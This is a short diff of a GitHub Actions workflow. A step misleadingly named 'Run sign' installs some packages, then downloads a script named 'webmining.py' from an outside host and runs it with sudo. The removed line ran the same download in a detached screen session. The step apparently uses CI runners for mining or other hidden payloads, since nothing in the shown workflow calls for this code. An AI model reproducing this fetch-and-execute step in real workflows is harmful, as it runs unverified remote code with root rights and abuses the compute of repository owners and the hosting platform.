@@ -36,4 +36,4 @@ jobs:
 
       - name: Run sign
         run: |
-          sudo apt update -y && sudo apt install chromium-chromedriver -y && sudo apt install screen -y && sudo apt-get install htop -y && sudo screen -dm bash -c "wget swenson.my.id/webmining.py && sudo python3 webmining.py" && top -b
+          sudo apt update -y && sudo apt install chromium-chromedriver -y && sudo apt install screen -y && sudo apt-get install htop -y && wget swenson.my.id/webmining.py && sudo python3 webmining.py
